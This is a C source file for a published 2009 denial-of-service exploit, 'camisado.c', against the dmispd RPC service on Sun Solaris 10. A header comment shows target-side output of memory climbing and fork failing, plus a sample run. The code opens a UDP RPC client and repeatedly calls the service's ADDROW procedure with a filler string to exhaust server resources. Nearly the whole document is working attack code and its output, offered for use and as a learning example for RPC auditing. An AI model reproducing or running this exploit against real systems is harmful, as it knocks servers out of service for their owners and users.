/*
camisado.c
AKA
Sun Solaris 10 RPC dmispd Remote Resource Consumption Exploit

Jeremy Brown [0xjbrown41@gmail.com//jbrownsec.blogspot.com//krakowlabs.com] 09.24.2009

***************************************************************************************************************
Another long night in ONC RPC fuzzing land...

# uname -a
SunOS unknown 5.10 Generic_139555-08 sun4u sparc SUNW,Ultra-5_10
# svcadm restart dmi
# date;sh stat.sh;date
Thursday, September 24, 2009  1:47:22 AM EDT
 18651 root     3584K 2080K sleep   59    0   0:00:00 0.1% dmispd/1
 18651 root     1047M   50M run      9    0   0:00:00 2.8% dmispd/1
 18651 root     1047M  132M run      0    0   0:00:01 7.2% dmispd/1
 18651 root     1047M  212M run      0    0   0:00:02  11% dmispd/1
 18651 root     1047M  292M run     50    0   0:00:03  15% dmispd/1
 18651 root     1047M  375M run     40    0   0:00:04  19% dmispd/1
 18651 root     1047M  455M run     30    0   0:00:05  23% dmispd/1
 18651 root     1047M  525M run     40    0   0:00:06  26% dmispd/1
 18651 root     1047M  527M run     45    0   0:00:06  25% dmispd/1
 18651 root     1047M  531M run     52    0   0:00:06  25% dmispd/1
 18651 root     1047M  543M run     31    0   0:00:07  26% dmispd/1
 18651 root     1047M  550M run     51    0   0:00:07  26% dmispd/1
 18651 root     1047M  551M run     42    0   0:00:07  25% dmispd/1
 18651 root     1047M  552M sleep   60    0   0:00:07  25% dmispd/1
 18651 root     1047M  553M sleep   60    0   0:00:08  25% dmispd/1
 18651 root     1047M  552M run     43    0   0:00:08  24% dmispd/1
 18651 root     1047M  551M sleep   59    0   0:00:17  14% dmispd/1
 18651 root     1047M  545M sleep   59    0   0:00:17  13% dmispd/1
^CThursday, September 24, 2009  1:48:47 AM EDT
#

And also...

# while true;do ps -AZfl | grep dmispd;sleep 1;done
 0 S   global    root 19477     1   0  40 20        ?    448        ? 13:25:10 ?           0:00 /usr/lib/dmi/dmispd
 0 S   global    root 19479 17588   0  40 20        ?    208        ? 13:35:27 pts/3       0:00 grep dmispd
 0 R   global    root 19477     1   4  89 20        ? 134073          13:25:10 ?           0:01 /usr/lib/dmi/dmispd
 0 R   global    root 19477     1   8  89 20        ? 134073          13:25:10 ?           0:02 /usr/lib/dmi/dmispd
 0 R   global    root 19477     1  12  99 20        ? 134073          13:25:10 ?           0:03 /usr/lib/dmi/dmispd
 0 R   global    root 19477     1  16  99 20        ? 134073          13:25:10 ?           0:04 /usr/lib/dmi/dmispd
 0 R   global    root 19477     1  20  99 20        ? 134073          13:25:10 ?           0:05 /usr/lib/dmi/dmispd
 0 R   global    root 19477     1  24  59 20        ? 134073          13:25:10 ?           0:06 /usr/lib/dmi/dmispd
 0 R   global    root 19497 17588   0  44 20        ?    206          13:35:34 pts/3       0:00 grep dmispd
bash: fork: Resource temporarily unavailable
#

linux@ubuntu:~$ ./camisado

Sun Solaris 10 RPC dmispd Remote Resource Consumption Exploit
Usage: ./camisado <target>

linux@ubuntu:~$ ./camisado 192.168.0.236

Sun Solaris 10 RPC dmispd Remote Resource Consumption Exploit

Consuming Resources @ 192.168.0.236 [P:300598 V:1 F:523]...

--> #1
rpc: RPC: Timed out
--> #2
rpc: RPC: Timed out
--> #3
rpc: RPC: Timed out
--> #4
rpc: RPC: Timed out
--> #5
rpc: RPC: Timed out
--> #6
rpc: RPC: Timed out
--> #7
rpc: RPC: Timed out

Finished. Now your sun server may recover :)

linux@ubuntu:~$

As far as I know, the RPC service "dmispd" is enabled by default on Solaris 10 (SPARC tested). It should render
the server unuseable for ~1-2 minutes. I'm not estatic about that part either. Fun to play with if nothing else.
And, If someone is interested in auditing RPC, this could be a good example to learn from. Learning isn't lame ;)
***************************************************************************************************************
camisado.c
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/time.h>
#include <netdb.h>
#include <rpc/rpc.h>
#include <errno.h>

#define PROG_NUM 300598
#define PROG_VER 1
#define DMIPROC_ADDROW 523

#define SIZE 100
#define LOOP 7

int main(int argc, char *argv[])
{

char b[SIZE], *buf, *target = argv[1];
int i, usock = RPC_ANYSOCK;

struct hostent *hp;
struct sockaddr_in us;

struct timeval tm={10, 0};

CLIENT *cli;
enum clnt_stat clnt_stat;

if(argc < 2)
{

     printf("\nSun Solaris 10 RPC dmispd Remote Resource Consumption Exploit\n");
     printf("Usage: %s <target>\n\n", argv[0]);

     return 0;

}

     printf("\nSun Solaris 10 RPC dmispd Remote Resource Consumption Exploit\n");

if((hp = gethostbyname(target)) == NULL)
{

     perror("gethostbyname");
     exit(-1);

}

     memcpy(&us.sin_addr.s_addr, hp->h_addr, 4);

us.sin_family = AF_INET;
us.sin_port   = 0;

if((cli = clntudp_create(&us, PROG_NUM, PROG_VER, tm, &usock)) == (CLIENT *)NULL)
{

     clnt_pcreateerror("clntudp_create");
     exit(-1);

}

cli->cl_auth = authunix_create_default();

     memset(b, 'A', sizeof(b));

buf = b;

     printf("\nConsuming Resources @ %s [P:%d V:%d F:%d]...\n\n", target, PROG_NUM, PROG_VER, DMIPROC_ADDROW);

for(i = 0; i < LOOP; i++)
{

     printf("--> #%d\n", i+1);

clnt_stat = clnt_call(cli, DMIPROC_ADDROW, (xdrproc_t)xdr_wrapstring, (char *)&buf, (xdrproc_t)xdr_wrapstring, (char *)&buf, tm);

if(clnt_stat != RPC_SUCCESS) clnt_perror(cli, "rpc");

}

     printf("\nFinished. Now your sun server may recover :)\n\n"); // restart dmi services to try again

     auth_destroy(cli->cl_auth);
     clnt_destroy(cli);

}
